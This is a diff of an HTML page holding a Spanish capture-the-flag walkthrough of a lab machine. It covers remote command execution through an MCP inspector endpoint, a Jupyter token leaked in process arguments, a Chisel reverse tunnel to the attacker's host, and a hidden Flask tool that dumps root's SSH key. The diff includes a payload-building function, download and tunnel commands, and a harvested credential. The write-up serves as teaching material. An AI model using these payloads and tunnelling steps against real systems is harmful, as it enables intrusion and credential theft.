+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$<span class="w"> </span>whoami
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>mcp-dev
+</code></pre></div>
 <p><img alt="Shell obtenida" src="cap3.png" /></p>
-<h3 id="analisis-de-la-vulnerabilidad">Análisis de la vulnerabilidad</h3>
+<h3 id="analisis-de-la-vulnerabilidad">Análisis de la vulnerabilidad<a class="headerlink" href="#analisis-de-la-vulnerabilidad" title="Permanent link">&para;</a></h3>
 <p>El éxito de este ataque radica en una mala implementación del <em>endpoint</em> de la API y una falta absoluta de sanitización de <em>inputs</em>. Si analizamos el código del PoC de Python, la magia ocurre en la función <code>build_payload</code>:</p>
-<pre><code class="language-python">def build_payload(command, server_id=&quot;rce_exploit&quot;):
-    &quot;&quot;&quot;Construct the malicious serverConfig payload.&quot;&quot;&quot;
-    return {
-        &quot;serverConfig&quot;: {
-            &quot;command&quot;: &quot;sh&quot;,
-            &quot;args&quot;: [&quot;-c&quot;, command],
-            &quot;env&quot;: {
-                &quot;DISPLAY&quot;: os.environ.get(&quot;DISPLAY&quot;, &quot;:0&quot;),
-            },
-        },
-        &quot;serverId&quot;: server_id,
-    }
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">build_payload</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">server_id</span><span class="o">=</span><span class="s2">&quot;rce_exploit&quot;</span><span class="p">):</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Construct the malicious serverConfig payload.&quot;&quot;&quot;</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    <span class="k">return</span> <span class="p">{</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>        <span class="s2">&quot;serverConfig&quot;</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>            <span class="s2">&quot;command&quot;</span><span class="p">:</span> <span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>            <span class="s2">&quot;args&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="n">command</span><span class="p">],</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>            <span class="s2">&quot;env&quot;</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>                <span class="s2">&quot;DISPLAY&quot;</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;DISPLAY&quot;</span><span class="p">,</span> <span class="s2">&quot;:0&quot;</span><span class="p">),</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>            <span class="p">},</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>        <span class="p">},</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>        <span class="s2">&quot;serverId&quot;</span><span class="p">:</span> <span class="n">server_id</span><span class="p">,</span>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>    <span class="p">}</span>
+</code></pre></div>
 <p>El flujo técnico de la vulnerabilidad es el siguiente:</p>
 <ol>
 <li><strong>El propósito legítimo:</strong> El endpoint <code>/api/mcp/connect</code> está diseñado para recibir un JSON con la configuración de un servidor de IA (Model Context Protocol). Espera un binario en el campo <code>command</code> (por ejemplo, <code>node</code> o <code>python</code>) y sus respectivos argumentos en <code>args</code>.</li>
@@ -1329,19 +1382,19 @@ mcp-dev
 <li><strong>Resultado:</strong> El servidor de desarrollo ejecuta ciegamente nuestra shell, conectando la máquina víctima de vuelta hacia nuestro puerto a la escucha.</li>
 </ol>
 <hr />
-<h2 id="3-movimiento-lateral-pivotando-a-analyst">3. Movimiento Lateral (Pivotando a analyst)</h2>
+<h2 id="3-movimiento-lateral-pivotando-a-analyst">3. Movimiento Lateral (Pivotando a analyst)<a class="headerlink" href="#3-movimiento-lateral-pivotando-a-analyst" title="Permanent link">&para;</a></h2>
 <p>Una vez que hemos estabilizado nuestra shell y verificado que somos el usuario <code>mcp-dev</code>, el siguiente paso lógico es enumerar el sistema en busca de vectores para escalar privilegios o movernos lateralmente hacia otros usuarios.</p>
 <p>Una de las primeras comprobaciones que siempre debemos hacer es listar los procesos que se están ejecutando en el sistema, prestando especial atención a servicios internos, procesos de otros usuarios o credenciales pasadas como argumentos en la línea de comandos.</p>
 <p>Ejecutamos <code>ps -aux</code> para listar todos los procesos:</p>
-<pre><code class="language-bash">mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ps -aux
-</code></pre>
-<pre><code class="language-text">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-root           1  0.0  0.2 166372 11788 ?        Ss   08:16   0:01 /sbin/init
-...
-analyst     1072  0.1  2.4 182532 96552 ?        Ss   08:16   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
-mcp-dev     1073  0.0  1.5 1511420 63872 ?       Ssl  08:16   0:00 npm start
-...
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$<span class="w"> </span>ps<span class="w"> </span>-aux
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>root           1  0.0  0.2 166372 11788 ?        Ss   08:16   0:01 /sbin/init
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>...
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>analyst     1072  0.1  2.4 182532 96552 ?        Ss   08:16   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>mcp-dev     1073  0.0  1.5 1511420 63872 ?       Ssl  08:16   0:00 npm start
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>...
+</code></pre></div>
 <p>Al revisar detenidamente la salida, detectamos un proceso sumamente interesante ejecutado por el usuario <code>analyst</code>. Se trata del servidor <strong>Jupyter-Lab</strong> (del cual teníamos constancia gracias al portal web inicial).</p>
 <p>Este hallazgo es crítico por dos razones:</p>
 <ol>
@@ -1349,148 +1402,148 @@ mcp-dev     1073  0.0  1.5 1511420 63872 ?       Ssl  08:16   0:00 npm start
 <li><strong>Filtración de credenciales:</strong> El desarrollador pasó el token de autenticación directamente como un argumento en la línea de comandos (<code>--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</code>). Esto es una mala práctica de seguridad conocida como <em>Process Command Line Leak</em>, ya que cualquier usuario del sistema puede leer los argumentos de ejecución de otros procesos mediante <code>ps</code> o leyendo el directorio <code>/proc</code>.</li>
 </ol>
 <p>Para confirmar los puertos locales abiertos, ejecutamos <code>ss -tlnp</code>:</p>
-<pre><code class="language-bash">mcp-dev@devhub:/tmp$ ss -tlnp                                                  
-State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                                                         
-LISTEN 0      128        127.0.0.1:5000      0.0.0.0:* LISTEN 0      128        127.0.0.1:8888      0.0.0.0:* LISTEN 0      511          0.0.0.0:80        0.0.0.0:* LISTEN 0      128          0.0.0.0:22        0.0.0.0:* LISTEN 0      511          0.0.0.0:6274      0.0.0.0:* users:((&quot;node-MainThread&quot;,pid=1275,fd=29))
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>mcp-dev@devhub:/tmp$<span class="w"> </span>ss<span class="w"> </span>-tlnp<span class="w">                                                  </span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>State<span class="w">  </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address:Port<span class="w"> </span>Peer<span class="w"> </span>Address:PortProcess<span class="w">                                                                         </span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>LISTEN<span class="w"> </span><span class="m">0</span><span class="w">      </span><span class="m">128</span><span class="w">        </span><span class="m">127</span>.0.0.1:5000<span class="w">      </span><span class="m">0</span>.0.0.0:*<span class="w"> </span>LISTEN<span class="w"> </span><span class="m">0</span><span class="w">      </span><span class="m">128</span><span class="w">        </span><span class="m">127</span>.0.0.1:8888<span class="w">      </span><span class="m">0</span>.0.0.0:*<span class="w"> </span>LISTEN<span class="w"> </span><span class="m">0</span><span class="w">      </span><span class="m">511</span><span class="w">          </span><span class="m">0</span>.0.0.0:80<span class="w">        </span><span class="m">0</span>.0.0.0:*<span class="w"> </span>LISTEN<span class="w"> </span><span class="m">0</span><span class="w">      </span><span class="m">128</span><span class="w">          </span><span class="m">0</span>.0.0.0:22<span class="w">        </span><span class="m">0</span>.0.0.0:*<span class="w"> </span>LISTEN<span class="w"> </span><span class="m">0</span><span class="w">      </span><span class="m">511</span><span class="w">          </span><span class="m">0</span>.0.0.0:6274<span class="w">      </span><span class="m">0</span>.0.0.0:*<span class="w"> </span>users:<span class="o">((</span><span class="s2">&quot;node-MainThread&quot;</span>,pid<span class="o">=</span><span class="m">1275</span>,fd<span class="o">=</span><span class="m">29</span><span class="o">))</span>
+</code></pre></div>
 <p>Efectivamente, los puertos <code>8888</code> (Jupyter) y <code>5000</code> (desconocido por ahora) están escuchando en localhost.</p>
-<h3 id="reverse-port-forwarding-con-chisel">Reverse Port Forwarding con Chisel</h3>
+<h3 id="reverse-port-forwarding-con-chisel">Reverse Port Forwarding con Chisel<a class="headerlink" href="#reverse-port-forwarding-con-chisel" title="Permanent link">&para;</a></h3>
 <p>Para interactuar cómodamente con la interfaz web de Jupyter-Lab (y utilizar nuestro propio navegador en la máquina atacante), necesitamos crear un túnel que exponga ese puerto local <code>8888</code> hacia nuestra máquina. Utilizaremos <strong>Chisel</strong>, una excelente herramienta para crear túneles TCP cifrados.</p>
 <p>Primero, levantamos un servidor HTTP temporal en nuestra máquina atacante para compartir el binario de Chisel:</p>
-<pre><code class="language-bash"># En la máquina atacante (IP: &lt;TU_IP&gt;)
-python3 -m http.server 8000
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># En la máquina atacante (IP: &lt;TU_IP&gt;)</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
 <p>Descargamos el binario en la máquina víctima (usaremos el directorio <code>/tmp</code> que tiene permisos de escritura general):</p>
-<pre><code class="language-bash">mcp-dev@devhub:/tmp$ wget http://&lt;TU_IP&gt;:8000/chisel.sh
-mcp-dev@devhub:/tmp$ chmod +x chisel.sh
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>mcp-dev@devhub:/tmp$<span class="w"> </span>wget<span class="w"> </span>http://&lt;TU_IP&gt;:8000/chisel.sh
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>mcp-dev@devhub:/tmp$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>chisel.sh
+</code></pre></div>
 <p>A continuación, levantamos el servidor de Chisel en nuestra máquina atacante en el puerto <code>9001</code> habilitando la opción de túnel inverso (<code>--reverse</code>):</p>
-<pre><code class="language-bash"># En la máquina atacante
-chisel server -p 9001 --reverse
-</code></pre>
-<pre><code class="language-text">2026/06/01 09:31:52 server: Reverse tunnelling enabled
-2026/06/01 09:31:52 server: Fingerprint 0q4JiWA3NFVSBZmv+N4ib55YK6rR8njazlhLY+sTacw=
-2026/06/01 09:31:52 server: Listening on http://0.0.0.0:9001
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># En la máquina atacante</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">9001</span><span class="w"> </span>--reverse
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>2026/06/01 09:31:52 server: Reverse tunnelling enabled
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>2026/06/01 09:31:52 server: Fingerprint 0q4JiWA3NFVSBZmv+N4ib55YK6rR8njazlhLY+sTacw=
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>2026/06/01 09:31:52 server: Listening on http://0.0.0.0:9001
+</code></pre></div>
 <p>Finalmente, ejecutamos el cliente de Chisel en la máquina víctima. Le indicamos que se conecte a nuestro servidor (<code>&lt;TU_IP&gt;:9001</code>) y que redirija el puerto remoto (<code>R</code>) <code>8888</code> hacia su propio <code>127.0.0.1:8888</code>.</p>
-<pre><code class="language-bash">mcp-dev@devhub:/tmp$ ./chisel.sh client &lt;TU_IP&gt;:9001 R:8888:127.0.0.1:8888
-</code></pre>
-<pre><code class="language-text">2026/06/01 09:33:17 client: Connecting to ws://&lt;TU_IP&gt;:9001
-2026/06/01 09:33:18 client: Connected (Latency 46.30068ms)
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>mcp-dev@devhub:/tmp$<span class="w"> </span>./chisel.sh<span class="w"> </span>client<span class="w"> </span>&lt;TU_IP&gt;:9001<span class="w"> </span>R:8888:127.0.0.1:8888
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>2026/06/01 09:33:17 client: Connecting to ws://&lt;TU_IP&gt;:9001
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>2026/06/01 09:33:18 client: Connected (Latency 46.30068ms)
+</code></pre></div>
 <p>En nuestra máquina atacante veremos la confirmación de la conexión:</p>
-<pre><code class="language-text">2026/06/01 09:33:18 server: session#1: tun: proxy#R:8888=&gt;8888: Listening
-</code></pre>
-<h3 id="explotacion-del-panel-de-jupyter">Explotación del Panel de Jupyter</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>2026/06/01 09:33:18 server: session#1: tun: proxy#R:8888=&gt;8888: Listening
+</code></pre></div>
+<h3 id="explotacion-del-panel-de-jupyter">Explotación del Panel de Jupyter<a class="headerlink" href="#explotacion-del-panel-de-jupyter" title="Permanent link">&para;</a></h3>
 <p>Con el túnel establecido, abrimos nuestro navegador web y navegamos hacia <code>http://127.0.0.1:8888</code>. Para saltarnos la pantalla de login, añadimos el token filtrado directamente en la URL:</p>
 <p><code>http://127.0.0.1:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</code></p>
 <p><img alt="Panel Jupyter" src="cap4.png" /></p>
 <p>Una vez dentro, el entorno de Jupyter nos permite ejecutar comandos en el sistema subyacente con los privilegios del usuario que inició el servicio. Para obtener una shell, simplemente nos dirigimos al menú superior y seleccionamos: <strong>File &gt; New &gt; Terminal</strong>.</p>
 <p>Esto nos abrirá una consola interactiva en la propia interfaz web. Comprobamos nuestra identidad y capturamos la primera flag:</p>
-<pre><code class="language-bash">analyst@devhub:~$ whoami
-analyst
-analyst@devhub:~$ ls
-jupyter-env  notebooks  user.txt
-analyst@devhub:~$ cat user.txt
-[REDACTED]
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>analyst@devhub:~$<span class="w"> </span>whoami
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>analyst
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>analyst@devhub:~$<span class="w"> </span>ls
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>jupyter-env<span class="w">  </span>notebooks<span class="w">  </span>user.txt
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>analyst@devhub:~$<span class="w"> </span>cat<span class="w"> </span>user.txt
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="o">[</span>REDACTED<span class="o">]</span>
+</code></pre></div>
 <p><img alt="Flag User" src="cap5.png" /></p>
 <hr />
-<h2 id="4-escalada-de-privilegios-root">4. Escalada de Privilegios (Root)</h2>
+<h2 id="4-escalada-de-privilegios-root">4. Escalada de Privilegios (Root)<a class="headerlink" href="#4-escalada-de-privilegios-root" title="Permanent link">&para;</a></h2>
 <p>Con el usuario <code>analyst</code> bajo nuestro control, volvemos a la terminal para buscar vías de escalada hacia <code>root</code>. Durante nuestra enumeración inicial de procesos, recordamos haber visto un servicio corriendo en el puerto local <code>5000</code> (<code>ss -tlnp</code>), y un proceso misterioso llamado <code>/opt/opsmcp/server.py</code> que se ejecutaba con altos privilegios.</p>
 <p>Como <code>analyst</code>, verificamos los permisos de este script:</p>
-<pre><code class="language-bash">analyst@devhub:~$ ls -la /opt/opsmcp/server.py
--rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>analyst@devhub:~$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/opt/opsmcp/server.py
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>-rw-r-----<span class="w"> </span><span class="m">1</span><span class="w"> </span>analyst<span class="w"> </span>analyst<span class="w"> </span><span class="m">6021</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">16</span><span class="w"> </span><span class="m">21</span>:49<span class="w"> </span>/opt/opsmcp/server.py
+</code></pre></div>
 <p>El archivo pertenece a nuestro usuario (<code>analyst</code>), lo que nos permite leer su contenido. Al inspeccionar el código fuente del script con <code>cat</code> (o preferiblemente con <code>vim</code> para tener resaltado de sintaxis), nos encontramos con una API desarrollada en Flask:</p>
-<pre><code class="language-python"># ... [Fragmento de código omitido para brevedad] ...
-
-# API Key for authentication
-VALID_API_KEY = &quot;opsmcp_secret_key_4f5a6b7c8d9e0f1a&quot;
-
-# ...
-
-# Hidden tools (not in /tools/list but callable)
-HIDDEN_TOOLS = {
-    &quot;ops._admin_dump&quot;: {
-        &quot;description&quot;: &quot;Emergency credential dump - INTERNAL ONLY&quot;,
-        &quot;parameters&quot;: {&quot;target&quot;: &quot;string&quot;, &quot;confirm&quot;: &quot;boolean&quot;}
-    },
-    # ...
-}
-
-# ...
-
-    elif tool_name == &quot;ops._admin_dump&quot;:
-        target = args.get('target', '')
-        confirm = args.get('confirm', False)
-
-        if not confirm:
-            return jsonify({
-                &quot;error&quot;: &quot;Confirmation required&quot;,
-                &quot;usage&quot;: &quot;Set confirm=true to proceed&quot;,
-                &quot;warning&quot;: &quot;This dumps sensitive credentials&quot;
-            })
-
-        if target == &quot;ssh_keys&quot;:
-            try:
-                with open('/root/.ssh/id_rsa', 'r') as f:
-                    key_data = f.read()
-                return jsonify({
-                    &quot;target&quot;: &quot;ssh_keys&quot;,
-                    &quot;root_private_key&quot;: key_data,
-                    &quot;note&quot;: &quot;Emergency recovery key dump&quot;
-                })
-# ...
-</code></pre>
-<h3 id="analisis-de-la-vulnerabilidad-hardcoded-credentials-security-by-obscurity">Análisis de la Vulnerabilidad (Hardcoded Credentials &amp; Security by Obscurity)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># ... [Fragmento de código omitido para brevedad] ...</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="c1"># API Key for authentication</span>
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">VALID_API_KEY</span> <span class="o">=</span> <span class="s2">&quot;opsmcp_secret_key_4f5a6b7c8d9e0f1a&quot;</span>
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="c1"># ...</span>
+<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
+<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="c1"># Hidden tools (not in /tools/list but callable)</span>
+<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="n">HIDDEN_TOOLS</span> <span class="o">=</span> <span class="p">{</span>
+<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>    <span class="s2">&quot;ops._admin_dump&quot;</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>        <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Emergency credential dump - INTERNAL ONLY&quot;</span><span class="p">,</span>
+<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>        <span class="s2">&quot;parameters&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;target&quot;</span><span class="p">:</span> <span class="s2">&quot;string&quot;</span><span class="p">,</span> <span class="s2">&quot;confirm&quot;</span><span class="p">:</span> <span class="s2">&quot;boolean&quot;</span><span class="p">}</span>
+<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>    <span class="p">},</span>
+<a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>    <span class="c1"># ...</span>
+<a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a><span class="p">}</span>
+<a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>
+<a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a><span class="c1"># ...</span>
+<a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>
+<a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>    <span class="k">elif</span> <span class="n">tool_name</span> <span class="o">==</span> <span class="s2">&quot;ops._admin_dump&quot;</span><span class="p">:</span>
+<a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>        <span class="n">target</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+<a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>        <span class="n">confirm</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;confirm&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
+<a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>
+<a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">confirm</span><span class="p">:</span>
+<a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
+<a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>                <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Confirmation required&quot;</span><span class="p">,</span>
+<a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>                <span class="s2">&quot;usage&quot;</span><span class="p">:</span> <span class="s2">&quot;Set confirm=true to proceed&quot;</span><span class="p">,</span>
+<a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>                <span class="s2">&quot;warning&quot;</span><span class="p">:</span> <span class="s2">&quot;This dumps sensitive credentials&quot;</span>
+<a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a>            <span class="p">})</span>
+<a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a>
+<a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a>        <span class="k">if</span> <span class="n">target</span> <span class="o">==</span> <span class="s2">&quot;ssh_keys&quot;</span><span class="p">:</span>
+<a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a>            <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/root/.ssh/id_rsa&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a>                    <span class="n">key_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<a id="__codelineno-24-34" name="__codelineno-24-34" href="#__codelineno-24-34"></a>                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
+<a id="__codelineno-24-35" name="__codelineno-24-35" href="#__codelineno-24-35"></a>                    <span class="s2">&quot;target&quot;</span><span class="p">:</span> <span class="s2">&quot;ssh_keys&quot;</span><span class="p">,</span>
+<a id="__codelineno-24-36" name="__codelineno-24-36" href="#__codelineno-24-36"></a>                    <span class="s2">&quot;root_private_key&quot;</span><span class="p">:</span> <span class="n">key_data</span><span class="p">,</span>
+<a id="__codelineno-24-37" name="__codelineno-24-37" href="#__codelineno-24-37"></a>                    <span class="s2">&quot;note&quot;</span><span class="p">:</span> <span class="s2">&quot;Emergency recovery key dump&quot;</span>
+<a id="__codelineno-24-38" name="__codelineno-24-38" href="#__codelineno-24-38"></a>                <span class="p">})</span>
+<a id="__codelineno-24-39" name="__codelineno-24-39" href="#__codelineno-24-39"></a><span class="c1"># ...</span>
+</code></pre></div>
+<h3 id="analisis-de-la-vulnerabilidad-hardcoded-credentials-security-by-obscurity">Análisis de la Vulnerabilidad (Hardcoded Credentials &amp; Security by Obscurity)<a class="headerlink" href="#analisis-de-la-vulnerabilidad-hardcoded-credentials-security-by-obscurity" title="Permanent link">&para;</a></h3>
 <p>Auditar este código nos revela múltiples fallos críticos de seguridad:</p>
 <ol>
 <li><strong>Credenciales Hardcodeadas:</strong> La clave de la API (<code>VALID_API_KEY</code>) está escrita en texto plano dentro del código fuente. Cualquiera que pueda leer el archivo (nosotros) puede autenticarse.</li>
 <li><strong>Seguridad por Oscuridad:</strong> El desarrollador intentó ocultar funciones críticas (<code>ops._admin_dump</code>) asumiendo que si no aparecían listadas en el endpoint público, nadie las encontraría.</li>
 <li><strong>Exposición de Archivos Críticos:</strong> La función oculta <code>ops._admin_dump</code>, cuando recibe el objetivo <code>ssh_keys</code> y la confirmación <code>confirm: true</code>, lee directamente la clave privada RSA del usuario <code>root</code> (<code>/root/.ssh/id_rsa</code>) y la devuelve en la respuesta JSON. Como el script de Flask se está ejecutando como <code>root</code>, tiene permisos para leer ese archivo.</li>
 </ol>
-<h3 id="explotacion-obteniendo-la-clave-de-root">Explotación (Obteniendo la clave de Root)</h3>
+<h3 id="explotacion-obteniendo-la-clave-de-root">Explotación (Obteniendo la clave de Root)<a class="headerlink" href="#explotacion-obteniendo-la-clave-de-root" title="Permanent link">&para;</a></h3>
 <p>Dado que la API escucha en <code>127.0.0.1:5000</code>, podemos interactuar con ella localmente utilizando <code>curl</code>. Formateamos una petición HTTP POST hacia el endpoint <code>/tools/call</code>, inyectamos la API key capturada en las cabeceras, y pasamos el JSON malicioso (o en este caso, "legítimo" pero no autorizado) que solicita la clave SSH.</p>
